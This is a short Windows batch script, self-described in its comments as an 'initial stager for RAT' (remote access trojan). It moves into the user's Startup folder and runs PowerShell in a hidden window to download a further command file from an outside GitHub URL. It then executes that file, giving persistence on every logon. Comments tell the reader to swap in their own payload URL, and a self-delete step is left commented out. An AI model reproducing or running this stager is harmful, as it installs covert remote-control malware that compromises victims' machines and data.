@echo off
@REM initial stager for RAT
@REM created by: DARk_LORD

@REM variables
set  "INITIALPATH=%cd%"
set  "STARTUP=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd %STARTUP%

@REM write payloads to startup
powershell powershell.exe -Command -windowstyle hidden  "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/wget.cmd -OutFile wget.cmd"
@rem change the  url of the above because this is  the only file we gonna use to run the paylaod thne the remaining files will download from the above link see the vide at he time eriod 2:06:00


@REM ru payload
powershell ./wget.cmd



@REM cd  back into the inittial location
@REM cd "%INITIALPATH%"
@REM del initial.cmd
@REM i am just testing the git updating






